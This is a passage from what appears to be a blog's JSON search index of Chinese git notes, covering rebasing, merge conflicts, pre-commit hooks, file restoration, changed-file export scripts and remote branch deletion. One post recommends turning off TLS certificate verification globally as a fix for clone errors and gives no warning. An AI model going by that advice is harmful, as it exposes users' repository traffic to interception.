href=\"https://gist.github.com/timdream/5968469#%E6%83%85%E5%A2%83pull-request-%E9%81%8E%E6%9C%9F%E7%84%A1%E6%B3%95%E5%90%88%E4%BD%B5\" target=\"_blank\" rel=\"noopener\">Github 發 Pull Request &amp; 貢獻流程速查</a></li>\n<li><a href=\"https://walterlv.com/post/safe-push-using-force-with-lease.html\" target=\"_blank\" rel=\"noopener\">Git 更安全的强制推送，–force-with-lease - walterlv</a></li>\n<li><a href=\"https://www.v2ex.com/t/184888\" target=\"_blank\" rel=\"noopener\">自己提交的 pull request 一直是 open，这个意思说一直在审核期吗？是不是说进入 close 了 就是审核通过了？ - V2EX</a><br>(<a href=\"https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/\" target=\"_blank\" rel=\"noopener\">https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/</a>)</li>\n<li><a href=\"https://cythilya.github.io/2018/05/27/git-merge-and-solve-conflict/\" target=\"_blank\" rel=\"noopener\">Git: 更新分支+解衝突 | Summer。桑莫。夏天</a></li>\n<li><a href=\"https://cythilya.github.io/2018/05/29/git-merge-squash-vs-rebase-squash/\" target=\"_blank\" rel=\"noopener\">Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天</a></li>\n<li><a href=\"https://stackoverflow.com/questions/38017517/git-pull-rebase-vs-git-rebase-whats-the-danger\" target=\"_blank\" rel=\"noopener\">git pull –rebase vs git rebase : what’s the danger? - Stack Overflow</a></li>\n</ul>\n<h2 id=\"git-pull-–rebase\"><a href=\"#git-pull-–rebase\" class=\"headerlink\" title=\"git pull –rebase\"></a>git pull –rebase</h2><p>這個東西非常玄<br>印象中感覺<code>Github Desktop</code>會做<code>git pull --rebase</code><br>所以好像很少會產生merge branch commit</p>\n<p><code>git pull --rebase = git fetch + git rebase</code></p>\n<p>發現git rebase , git merge 合併預設remote可以省略<br>詳細裡面內容</p>\n<ul>\n<li><a href=\"https://cythilya.github.io/2018/05/27/git-merge-and-solve-conflict/\" target=\"_blank\" rel=\"noopener\">Git: 更新分支+解衝突 | Summer。桑莫。夏天</a></li>\n<li><a href=\"https://cythilya.github.io/2018/05/29/git-merge-squash-vs-rebase-squash/\" target=\"_blank\" rel=\"noopener\">Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天</a><a href=\"/blog/2018/12/06/gitea試完合併分支-PR/web2.png\" title=\"備份圖\">備份圖</a>\n還有Squash，感覺可以應用比較特別情境上面<br>先留著筆記</li>\n</ul>\n<h2 id=\"PR-其實local端也可以做到\"><a href=\"#PR-其實local端也可以做到\" class=\"headerlink\" title=\"PR  其實local端也可以做到\"></a>PR  其實local端也可以做到</h2><p>參考gitlab說明<br><img src=\"/blog/2018/12/06/gitea試完合併分支-PR/3.png\" title=\"gitlab上面local合併說明\"><br><del>不過有好PR功能不用嗎o.&lt;</del></p>\n<h2 id=\"怎麼快速了解git-ours和theirs\"><a href=\"#怎麼快速了解git-ours和theirs\" class=\"headerlink\" title=\"怎麼快速了解git ours和theirs\"></a>怎麼快速了解git ours和theirs</h2><p>查看裡面說明，講得很清楚<br><a href=\"https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/\" target=\"_blank\" rel=\"noopener\">化解冲突：git merge 与 git rebase 中的 ours 和 theirs | Ming’s Blog</a></p>\n<blockquote>\n<p>可以看出，&lt;&lt;&lt;&lt;&lt;&lt;&lt; 和 &gt;&gt;&gt;&gt;&gt;&gt;&gt; 清晰地标示出了冲突的部分。你需要将它们改成期望的样子。如果你想保留两个版本中的一个而不引入新的修订，就可以使用两个预先定义的代词。&lt;&lt;&lt;&lt;&lt;&lt;&lt; 和 ======= 之间的部分称为 ours, ======= 和 &gt;&gt;&gt;&gt;&gt;&gt;&gt; 之间则称为 theirs. 此时，你只需要键入合适的指令即可化解冲突，而不需要进入文本编辑器。在当前项目可以得到如下运行结果</p>\n</blockquote>\n<p>不過…，rebase是相反的<br>我這邊猜rebase因為是把<code>另外分支</code>為基準<br>所以自己的code可能算在theirs(自己猜測)</p>\n<h2 id=\"git-rebase小記\"><a href=\"#git-rebase小記\" class=\"headerlink\" title=\"git rebase小記\"></a>git rebase小記</h2><p>從開始commit開始做<br>舊的commit會從<code>上面依序往下排</code><br><code>git rebase -i --root</code></p>\n<ul>\n<li><a href=\"https://www.youtube.com/user/blue524326/videos\" target=\"_blank\" rel=\"noopener\">沈弘哲 - YouTube</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=8h0K-2OaeSk\" target=\"_blank\" rel=\"noopener\">git pull vs git pull –rebase - YouTube</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=JhY0rR2wQq0&amp;t=3s\" target=\"_blank\" rel=\"noopener\">git rebase interactive - reword - PART 1 - YouTube</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=TCKjQppHxxQ\" target=\"_blank\" rel=\"noopener\">git rebase interactive - edit - PART 2 - YouTube</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=bfrZrbEHis0\" target=\"_blank\" rel=\"noopener\">git rebase interactive - squash fixup - PART 3 - YouTube</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=u8imRiiSyzk\" target=\"_blank\" rel=\"noopener\">(20) git rebase interactive - exec drop - PART 4 - YouTube</a></li>\n</ul>\n<p>題外話，剛剛我筆電(elementaryos, git 2.7.x)做<code>git log</code>確沒有顯示HEAD跟remote資訊<br>查了一下，需要加<code>--decorate</code><br>疑似之後2.13的git預設是<code>--decorate</code><br><a href=\"https://stackoverflow.com/questions/21607305/how-to-make-git-log-decorate-by-default\" target=\"_blank\" rel=\"noopener\">git log - How to make git log decorate by default - Stack Overflow</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"git不需要打帳號密碼push(SSH)","url":"/blog/2018/04/08/git%E4%B8%8D%E9%9C%80%E8%A6%81%E6%89%93%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BCpush/","content":"<p>最近犯了一個小錯誤<br>Hexo裡的config裡面<br>repo: 放https開頭<br>但是以為ssh金鑰能登入….</p>\n<a id=\"more\"></a>\n<p>但突然想到…我以前有寫過BitBucket<br><a href=\"https://malagege.github.io/blog/2017/11/06/logdown/2017-11-06-3301727/\">[BitBucket]做git pull一直問你輸入密碼 | 程式狂想筆記</a><br>這邊平常使用Github都是https開頭<br>因為從github看到都是https開頭…..</p>\n<p>網路爬了一下有詳細說明<br><a href=\"https://nyllep.wordpress.com/2012/01/21/sshkey-for-bitbucket/\" target=\"_blank\" rel=\"noopener\">產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦</a></p>\n<p>希望不要下次再採雷XD</p>\n<p>參考來源：<br><a href=\"https://nyllep.wordpress.com/2012/01/21/sshkey-for-bitbucket/\" target=\"_blank\" rel=\"noopener\">產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦</a></p>\n","categories":["寫程式一些事"],"tags":["git","hexo","ssh","bitbucket","github"]},{"title":"git不能clone下來的問題","url":"/blog/2019/03/16/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/","content":"<p>網路找到很多這個解法</p>\n<a id=\"more\"></a>\n<h2 id=\"HTTPS-解除-SSL-憑證檢查\"><a href=\"#HTTPS-解除-SSL-憑證檢查\" class=\"headerlink\" title=\"HTTPS 解除 SSL 憑證檢查\"></a>HTTPS 解除 SSL 憑證檢查</h2><h3 id=\"設定全域不檢查方法\"><a href=\"#設定全域不檢查方法\" class=\"headerlink\" title=\"設定全域不檢查方法\"></a>設定全域不檢查方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.sslVerify <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"設定當下不檢查-SSL-方法\"><a href=\"#設定當下不檢查-SSL-方法\" class=\"headerlink\" title=\"設定當下不檢查 SSL 方法\"></a>設定當下不檢查 SSL 方法</h3><p>原本想說看有沒有暫時的語法<br>後來找到這個</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.创建临时环境变量：</span><br><span class=\"line\"></span><br><span class=\"line\">windows上命令行输入：</span><br><span class=\"line\"></span><br><span class=\"line\">set GIT_SSL_NO_VERIFY=true git clone</span><br><span class=\"line\"></span><br><span class=\"line\">Linux下：</span><br><span class=\"line\"></span><br><span class=\"line\">env GIT_SSL_NO_VERIFY=true git push</span><br></pre></td></tr></table></figure>\n<p>但我的 window 的 git bash 上面指令都不管用<br>不過我後來找到一篇用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> GIT_SSL_NO_VERIFY=1</span><br></pre></td></tr></table></figure>\n<p>可以解決</p>\n<p><a href=\"https://blog.csdn.net/officercat/article/details/39989837\" target=\"_blank\" rel=\"noopener\">执行 Git 命令时出现各种 SSL certificate problem 的解决办法 - officercat 的专栏 - CSDN 博客</a><br><a href=\"https://stackoverflow.com/questions/9008309/how-do-i-set-git-ssl-no-verify-for-specific-repos-only\" target=\"_blank\" rel=\"noopener\">git - How do I set GIT_SSL_NO_VERIFY for specific repos only? - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/7526182/git-ssl-error-on-windows\" target=\"_blank\" rel=\"noopener\">Git ssl error on windows - Stack Overflow</a></p>\n<h3 id=\"改成-SSL-方法也能解決這個問題\"><a href=\"#改成-SSL-方法也能解決這個問題\" class=\"headerlink\" title=\"改成 SSL 方法也能解決這個問題\"></a>改成 SSL 方法也能解決這個問題</h3><p>另外，還有一種方法就是改成用 ssh 方法<br>git clone 也能解決這個問題</p>\n","categories":["Git"],"tags":["git"]},{"title":"git保護分支不會被commit","url":"/blog/2018/10/11/git%E4%BF%9D%E8%AD%B7%E5%88%86%E6%94%AF%E4%B8%8D%E6%9C%83%E8%A2%ABcommit/","content":"<p>最近在pull master實候<br>竟然發現merge….<br>雖然不知道發生了什麼事情<br>但不應該這樣<br>後來找到是我在master commit!!!!!</p>\n<a id=\"more\"></a>\n<p>立馬不說，先壓縮一個檔案起來(裡面有程式還沒commit 怕怕)<br>先用<code>git reset  xxxx^ --hard</code><br>順利還原!!!</p>\n<p>未了怕悲劇發生，於是我開始找如何防止master commit<br>後來找到<a href=\"https://marketplace.visualstudio.com/items?itemName=teledemic.branch-warnings\" target=\"_blank\" rel=\"noopener\">Git Branch Warnings - Visual Studio Marketplace</a><br>不過下載數不高，所以沒有使用</p>\n<p>最後找到<a href=\"https://gist.github.com/aaronhoffman/ffbfd36928f9336be2436cffe39feaec\" target=\"_blank\" rel=\"noopener\">git hooks - prevent commit to local master branch and prevent push to remote master branch</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># prevent commit to local master branch</span></span><br><span class=\"line\"></span><br><span class=\"line\">branch=`git symbolic-ref HEAD`</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$branch</span>\"</span> = <span class=\"string\">\"refs/heads/master\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"pre-commit hook: Can not commit to the local master branch.\"</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure></p>\n<p>最後修改</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># prevent commit to local master branch</span></span><br><span class=\"line\"></span><br><span class=\"line\">branch=`git symbolic-ref HEAD`</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$branch</span>\"</span> = <span class=\"string\">\"refs/heads/master\"</span> ] || [ <span class=\"string\">\"<span class=\"variable\">$branch</span>\"</span> = <span class=\"string\">\"refs/heads/mixed\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"pre-commit hook: Can not commit to the local master/mixed branch.\"</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n<p>放在<code>.git/hook/pre-commit</code>就完成</p>\n","categories":["Git"],"tags":["git","git hook"]},{"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","url":"/blog/2019/01/12/git%E5%87%BA%E7%8F%BE%E3%80%8Ccurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E3%80%8D%E9%8C%AF%E8%AA%A4/","content":"<p>今天發生怪事<br>公司內網 gitlab 網址 ip 換成網域導致 socuretree 跟 git bash 不能用<br>後來再找解決的方法</p>\n<a id=\"more\"></a>\n<p>##解決方法</p>\n<h3 id=\"git-remote-改成-ssh-網址\"><a href=\"#git-remote-改成-ssh-網址\" class=\"headerlink\" title=\"git remote 改成 ssh 網址\"></a>git remote 改成 ssh 網址</h3><p>走 ssh 方式就能順利解決 git 連線的問題</p>\n<h3 id=\"改-curl-cainfo-此方法跟這個沒關係\"><a href=\"#改-curl-cainfo-此方法跟這個沒關係\" class=\"headerlink\" title=\"改 curl.cainfo(此方法跟這個沒關係)\"></a>改 curl.cainfo(此方法跟這個沒關係)</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php.ini 中的 openssl.cafile 設定</span><br><span class=\"line\">php.ini 中的 curl.cainfo 設定</span><br><span class=\"line\">php.ini 中的 /usr/local/etc/openssl/cert.pem 設定 (Homebrew provided)</span><br></pre></td></tr></table></figure>\n<p>我發現用瀏覽器網頁都正常，但是在 curl 上面就不正常…<br>但我這個是 gitlab…，所以跟 php 沒有什麼關係<br><a href=\"http://labs.beyond.com.tw/blog/?p=685\" target=\"_blank\" rel=\"noopener\">labs.beyond.com.tw » Yosemite 上 Guzzle 遇到的 openssl certificate 問題</a></p>\n<h3 id=\"憑證看起來沒辦法用在內網上面\"><a href=\"#憑證看起來沒辦法用在內網上面\" class=\"headerlink\" title=\"憑證看起來沒辦法用在內網上面\"></a>憑證看起來沒辦法用在內網上面</h3><p>瀏覽器網頁都正常，但是在 curl 上面就不正常…，我還不確定能不能這樣用<br>不過看到下面這篇<br><a href=\"http://koolshare.cn/thread-64823-1-1.html\" target=\"_blank\" rel=\"noopener\">SSL 证书是不是不能绑定 192.168.1.1 这类本地地址？ - 梅林 - KoolShare - 源于玩家 服务玩家</a></p>\n<p>其他參考來源：<br><a href=\"https://ssorc.tw/6440\" target=\"_blank\" rel=\"noopener\">使用 plesk ssh chrooted 遇到 git clone https SSL 問題 | SSORC.tw</a><br><a href=\"http://linux-guys.blogspot.com/2010/12/lighttpd-httpsssl.html\" target=\"_blank\" rel=\"noopener\">蚊子館: Lighttpd - HTTPS(SSL)</a><br><a href=\"https://shazi.info/%E7%94%A8-curl-%E5%92%8C-wget-%E7%95%A5%E9%81%8E-ssl-%E6%86%91%E8%AD%89-%E7%AD%86%E8%A8%98/\" target=\"_blank\" rel=\"noopener\">用 curl 和 wget 略過 SSL 憑證 - 筆記 | Mr. 沙先生</a><br><a href=\"https://blog.csdn.net/sanbingyutuoniao123/article/details/71124655\" target=\"_blank\" rel=\"noopener\">curl: (60) SSL certificate problem: unable to get local issuer certificate 错误 - 不忘初心，方得始终 - CSDN 博客</a><br><a href=\"https://www.zhihu.com/question/28654385\" target=\"_blank\" rel=\"noopener\">sourcetree 的远程创库验证名字出错，但是记住名字。如何修改？ - 知乎</a><br><a href=\"https://snippetinfo.net/media/1973\" target=\"_blank\" rel=\"noopener\">git 如何避開 SSL 憑證問題 | 老洪的 IT 學習系統</a><br><a href=\"https://blog.csdn.net/fishmai/article/details/76400931\" target=\"_blank\" rel=\"noopener\">通过 SourceTree 连接 SSL 有问题的自建 gitlab 服务器 - fishmai 的专栏 - CSDN 博客</a></p>\n"},{"title":"git同步分支衝突解決方法","url":"/blog/2018/06/02/git%E5%90%8C%E6%AD%A5%E5%88%86%E6%94%AF%E8%A1%9D%E7%AA%81%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/","content":"<p>之前副理叫我push上去他加入的gitlab空repo<br>我push竟然跑出<code>fatal: refusing to merge unrelated histories</code><br>好在Google一下有找到答案</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">git pull origin master --allow-unrelated-histories</span><br></pre></td></tr></table></figure>\n<p>不過後來有想到一個方法<br>就是直接下載那個git clone<br>然後copy檔案到那個clone下來就直接commit</p>\n<p>但這缺點就不法把之前所有commit帶進去<br>看來還是用Google找的方法</p>\n<p>參考來源</p>\n<ul>\n<li><a href=\"https://github.com/doggy8088/Learn-Git-in-30-days/issues/31\" target=\"_blank\" rel=\"noopener\">第 24 天：使用 GitHub 遠端儲存庫 - 入門篇 – 範例照打無法成功 · Issue #31 · doggy8088/Learn-Git-in-30-days · GitHub</a></li>\n<li><a href=\"https://stackoverflow.com/questions/4847101/git-which-is-the-default-configured-remote-for-branch\" target=\"_blank\" rel=\"noopener\">git push - Git: which is the default configured remote for branch? - Stack Overflow</a></li>\n<li><a href=\"https://notes.wanghao.work/2017-06-28-%E8%A7%A3%E5%86%B3Git-refusing-to-merge-unrelated-histories%E9%97%AE%E9%A2%98.html\" target=\"_blank\" rel=\"noopener\">解决Git refusing to merge unrelated histories问题 | Doublemine</a></li>\n</ul>\n","categories":["Git"],"tags":["git"]},{"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","url":"/blog/2019/03/21/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/","content":"<p>最近修改程式，想還原之前某一隻檔案的時候<br>下意識想做<code>git reset</code><br>但是突然想到我只想還原一個檔案<br>雖然我有 vscode 可以用 gitlens 去看之前檔案全選出來<br>但還是覺得看看有沒有找檔案的方式</p>\n<a id=\"more\"></a>\n<h2 id=\"git-從某一個-commit-還原某一個檔案\"><a href=\"#git-從某一個-commit-還原某一個檔案\" class=\"headerlink\" title=\"git 從某一個 commit 還原某一個檔案\"></a>git 從某一個 commit 還原某一個檔案</h2><p>最後找到用<code>git checkout</code>方式還原<br>等等，我記得之前運用都是當下 commit 還原一個檔案<br>沒想到她竟然還有指定 commit 功能?!!</p>\n<p>這邊可能很多人會忘記<code>git checkout</code>跟<code>git reset</code>還原差異<br>可以看裡面的圖，幫助回憶<a href=\"https://malagege.github.io/blog/2018/11/09/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/\">git reset 和 git reflog 小記 | 程式狂想筆記</a></p>\n<h3 id=\"one-file-recover\"><a href=\"#one-file-recover\" class=\"headerlink\" title=\"one file recover\"></a>one file recover</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 還原指定一隻檔案</span></span><br><span class=\"line\"><span class=\"comment\">## head -- 可以省略(前提不要跟自己的branch撞到名子就好，通常撞到機率低)</span></span><br><span class=\"line\">git checkout head -- application/controllers/xxxx/xxxx.php</span><br><span class=\"line\">git checkout b01* -- application/controllers/line/LibraryPlaylist.php</span><br><span class=\"line\">git checkout head -- application/controllers/line/LibraryPlaylist.php</span><br></pre></td></tr></table></figure>\n<h3 id=\"all-file-recover\"><a href=\"#all-file-recover\" class=\"headerlink\" title=\"all file recover\"></a>all file recover</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git reset HEAD</span><br></pre></td></tr></table></figure>\n<p>##</p>\n<p><a href=\"http://www.andrewchen.tw/2017/02/11/20170211_NOTE_git%E9%82%84%E5%8E%9F%E5%96%AE%E4%B8%80%E6%AA%94%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">Git 還原單一檔案 | 愛吃東西的 RD</a></p>\n<h2 id=\"git-log-搜尋檔案方法\"><a href=\"#git-log-搜尋檔案方法\" class=\"headerlink\" title=\"git log 搜尋檔案方法\"></a>git log 搜尋檔案方法</h2><p>常常使用 gitlens 功能<br>他有一個很神奇功能<br>可以看當下檔案存在那些 commit<br>看當下行數有存在那些 commit<br>今天好奇查了一下指令要怎麼下</p>\n<h3 id=\"file-history\"><a href=\"#file-history\" class=\"headerlink\" title=\"file history\"></a>file history</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span> <span class=\"string\">'*/xxxx.php'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"line-history\"><a href=\"#line-history\" class=\"headerlink\" title=\"line history\"></a>line history</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span> -L 103,103:application/xxxx/xxxx.php</span><br></pre></td></tr></table></figure>\n<h3 id=\"gitk-log\"><a href=\"#gitk-log\" class=\"headerlink\" title=\"gitk log\"></a>gitk log</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gitk <span class=\"string\">'*/Trackinfo.php'</span></span><br><span class=\"line\"><span class=\"comment\">#這邊L後面數字要連在一起</span></span><br><span class=\"line\">gitk -L103,103:application/models/line/api/Mod_libraryPlaylist.php</span><br></pre></td></tr></table></figure>\n","categories":["Git"],"tags":["git"]},{"title":"git查看兩個commit異動有哪些檔案和打包方法","url":"/blog/2018/11/09/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/","content":"<p>最近有同事需要我異動有哪些檔案<br>我找一個(方便)方法到用git看方法<br>在這邊小記</p>\n<a id=\"more\"></a>\n<h2 id=\"git-diff-tree\"><a href=\"#git-diff-tree\" class=\"headerlink\" title=\"git diff-tree\"></a>git diff-tree</h2><p>git diff-tree<br><code>git diff-tree --no-commit-id --name-only -r commit_id1 commit_id2</code></p>\n<p>不過這個在我公司那台怪怪的<br>我家電腦正常<br>所以才找到下面這個方法</p>\n<h2 id=\"git-diff\"><a href=\"#git-diff\" class=\"headerlink\" title=\"git diff\"></a>git diff</h2><p><code>git diff --name-only  commit_id1 commit_id2</code><br><a href=\"https://stackoverflow.com/questions/10459374/making-git-diff-stat-show-full-file-path\" target=\"_blank\" rel=\"noopener\">Making git diff –stat show full file path - Stack Overflow</a></p>\n<h2 id=\"打包檔案方法\"><a href=\"#打包檔案方法\" class=\"headerlink\" title=\"打包檔案方法\"></a>打包檔案方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git archive --format zip -o filename.zip HEAD</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git archive --format zip -o $(git log --date=short --pretty=format:&quot;%ad&quot; -1).zip HEAD</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat &gt; ~/bin/git-zip</span><br><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">git archive --format zip -o $(git log --pretty=format:&quot;%h&quot; -1).zip HEAD</span><br><span class=\"line\">$ chmod u+x ~/bin/git-zip</span><br><span class=\"line\">$ cd git-repository</span><br><span class=\"line\">$ git zip</span><br></pre></td></tr></table></figure>\n<p>以上範例參考如<a href=\"http://blog.nutsfactory.net/2010/02/01/git-archive-and-log/\" target=\"_blank\" rel=\"noopener\">git archive 與 log 小技巧 – Rex’s blah blah blah</a><br>感覺這東西以後還是會用的到</p>\n<p>更進階的用法:<a href=\"http://lulualulu.com/%E5%A6%82%E4%BD%95%E8%AE%93git%E5%8C%AF%E5%87%BA%E5%85%A9%E5%80%8Bcommit%E4%B9%8B%E9%96%93%E6%9B%B4%E6%96%B0%E6%88%96%E6%96%B0%E5%A2%9E%E7%9A%84%E6%AA%94%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村</a></p>\n<p>Date: 2018-12-15</p>\n<p>今天PM跟我要最近上傳更動幾個commit<br>由於我們公司上傳git方式比較不一樣<br>部屬程式導致有些commit有上線、有些沒有上線….</p>\n<p>剛好之前有記錄到<a href=\"http://lulualulu.com/%E5%A6%82%E4%BD%95%E8%AE%93git%E5%8C%AF%E5%87%BA%E5%85%A9%E5%80%8Bcommit%E4%B9%8B%E9%96%93%E6%9B%B4%E6%96%B0%E6%88%96%E6%96%B0%E5%A2%9E%E7%9A%84%E6%AA%94%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村</a></p>\n<p>裡面有<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo Eport GitDiff</span><br><span class=\"line\">set /p input1=Export Start Commit ID: </span><br><span class=\"line\">set commitIdStart=%input1%</span><br><span class=\"line\">set /p input2=Export End Commit ID: </span><br><span class=\"line\">if [%input2%] ==[] (set commitIdEnd=HEAD) else (set commitIdEnd=%input2%)</span><br><span class=\"line\">echo Start ID = %commitIdStart%</span><br><span class=\"line\">echo End ID = %commitIdEnd%</span><br><span class=\"line\">for /f &quot;skip=1&quot; %%x in (&apos;wmic os get localdatetime&apos;) do if not defined DateTime set DateTime=%%x</span><br><span class=\"line\">echo %DateTime%</span><br><span class=\"line\">set exportFolder=%DateTime:~0,4%%DateTime:~4,2%%DateTime:~6,2%_%DateTime:~8,6%</span><br><span class=\"line\">echo %exportFolder%</span><br><span class=\"line\">for /f &quot;usebackq tokens=*&quot; %%A in (`git diff-tree -r --no-commit-id --name-only --diff-filter=ACMRT %commitIdStart% %commitIdEnd%`) do echo FA|xcopy &quot;%%~fA&quot; &quot;GitExport\\%exportFolder%\\%%A&quot;</span><br><span class=\"line\">set /p DUMMY =Hit Enter To Continue....</span><br></pre></td></tr></table></figure></p>\n<p>這段就派上用場了</p>\n<p>我以為這些內容都是從commit提取出來<br>但事實上不是這樣的<br>其實是透過<code>git diff-tree</code>顯示commit 改動有哪些檔案<br>然後她會從你現在本地端複製檔案到資料夾裡面，<strong>不是從commit複製當時候的內容</strong><br>所以使用上也要特別注意一下head現在狀態是不是你要打包的內容</p>\n<p><strong>上面敘述commit踩雷事項</strong><br>因為上次實作，需要做兩個commit<code>commitIdStart</code>、<code>commitIdEnd</code><br>輸入完只有打包到兩個commit內容<br>但是…其實第一個commit不會包到<br>也就是放置兩個commit第一個commit不會算到<br>為什麼呢?<br>其實<code>git diff-tree</code>是比較兩個commit差異，所以第一個commit不會被比較到<br>讓我想到rebase也是一樣</p>\n<p><strong>當不連續commit要怎麼辦</strong></p>\n<p>PM要求不練續的commit要怎麼辦?<br>其實我覺得上面腳本只適合做連續commit<br>但今天研究了一下<br>其實透過上面腳本還是能做到啦</p>\n<p>只要改腳本  時間資料夾拿掉<br>在多次執行腳本就可以了<br>雖然還是沒反杜絕手動的錯誤<br>但還是可以這樣用<br>總比人工scp跟sftp是不樣的東西複製檔案好多了吧</p>\n","categories":["Git"],"tags":["git","git archive"]},{"title":"git刪除遠端(remote)分支和強制pull下來分支","url":"/blog/2018/11/26/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/","content":"<p>最近專案有新的需求<br>剛好用git刪除舊分支<br>遠端分支還是存在<br>沒刪掉就感覺少了什麼</p>\n<a id=\"more\"></a>\n<h2 id=\"git刪除遠端-remote-分支\"><a href=\"#git刪除遠端-remote-分支\" class=\"headerlink\" title=\"git刪除遠端(remote)分支\"></a>git刪除遠端(remote)分支</h2><p><code>git push origin :cat</code></p>\n<blockquote>\n<p>$ git push origin master:cat<br>意思就是要把本地的 master 分支推上去之後，在 Server 上建立 cat 分支。如果把這個指令前面的 master 拿掉：<br>$ git push origin :cat<br>就像是推了空的內容去更新線上的 cat 分支的內容，也算是變相的把該分支刪除。只是使用 Push 指令刪分支，有一點不直覺而已。</p>\n</blockquote>\n<p>參考來源：<a href=\"https://gitbook.tw/chapters/github/delete-remote-branch.html\" target=\"_blank\" rel=\"noopener\">【狀況題】怎麼刪除遠端的分支？ - 為你自己學 Git | 高見龍</a></p>\n<p>用空分支上傳覆蓋空分支，這個記法真的很方便</p>\n<h2 id=\"強制pull下來分支\"><a href=\"#強制pull下來分支\" class=\"headerlink\" title=\"強制pull下來分支\"></a>強制pull下來分支</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">I think this is the right way:</span><br><span class=\"line\"></span><br><span class=\"line\">git fetch --all</span><br><span class=\"line\"></span><br><span class=\"line\">Then, you have two options:</span><br><span class=\"line\"></span><br><span class=\"line\">git reset --hard origin/master</span><br><span class=\"line\"></span><br><span class=\"line\">OR If you are on some other branch:</span><br><span class=\"line\"></span><br><span class=\"line\">git reset --hard origin/&lt;branch_name&gt;</span><br></pre></td></tr></table></figure>\n<p>參考來源:<a href=\"https://stackoverflow.com/questions/1125968/how-do-i-force-git-pull-to-overwrite-local-files\" target=\"_blank\" rel=\"noopener\">version control - How do I 